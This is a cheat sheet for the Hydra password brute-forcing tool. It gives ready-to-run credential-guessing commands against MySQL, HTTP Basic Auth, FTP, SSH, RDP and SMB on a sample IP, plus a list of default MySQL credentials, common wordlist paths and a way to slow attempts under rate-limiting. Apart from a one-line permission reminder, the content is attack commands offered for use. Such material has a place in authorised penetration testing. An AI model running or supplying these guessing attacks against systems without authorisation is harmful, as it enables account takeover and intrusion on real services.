# Hydra Cheat Sheet

This cheat sheet serves as a quick reference for using **Hydra** with different services, so you don't have to Google every time! 🚀

## 🔹 Brute-Forcing MySQL (Username:Password Pairs)

If your credential list is formatted as `username:password` (e.g., `root:mysql`), use the `-C` option:

```bash
hydra -C /tmp/default_mysql.txt -f mysql://192.168.129.74 -V -I
```

### **Example Credential List (`default_mysql.txt`)**
```
root:mysql
root:root
root:chippc
admin:admin
root:
root:nagiosxi
root:usbw
cloudera:cloudera
root:cloudera
root:moves
```

### **Options Explained:**
- `-C /tmp/default_mysql.txt` → Use a colon-separated (`username:password`) credential list.
- `-f` → Stop on first valid login.
- `mysql://192.168.129.74` → Target MySQL service on the given IP.
- `-V` → Show each login attempt.
- `-I` → Ignore failures and keep going.

---

## 🔹 Brute-Forcing HTTP Basic Authentication (`http-get`)

For services using **Basic Authentication**, you can brute-force credentials like this:

```bash
hydra -L users.txt -P passwords.txt 192.168.129.74 http-get /phpmyadmin
```

### **With Custom Headers (e.g., User-Agent & Cookies)**
If the target requires custom headers, use `-m`:

```bash
hydra -L users.txt -P passwords.txt 192.168.129.74 http-get "/phpmyadmin" -m "User-Agent: Mozilla/5.0\nCookie: PHPSESSID=abcd1234"
```

### **Using Username:Password List (`username:password` Format)**
If your list has `username:password` pairs, use `-C`:

```bash
hydra -C creds.txt 192.168.129.74 http-get /phpmyadmin
```

---

## 🔹 More Hydra Examples

### **FTP Bruteforce**
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.129.74 -V
```

### **SSH Bruteforce**
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.129.74 -t 4 -V
```

### **RDP Bruteforce**
```bash
hydra -L users.txt -P passwords.txt rdp://192.168.129.74 -V
```

### **SMB Bruteforce**
```bash
hydra -L users.txt -P passwords.txt smb://192.168.129.74 -V
```

---

## 🔹 Useful Wordlists
- **RockYou** (Common Passwords): `/usr/share/wordlists/rockyou.txt`
- **SecLists Default Creds**: `SecLists/Passwords/Default-Credentials/`

---

### **📌 Notes:**
- Always use **ethical hacking practices** and ensure you have permission before testing.
- If the target has **rate-limiting**, reduce the speed with `-t 1 -w 30`.

🚀 Happy Hunting! 💀
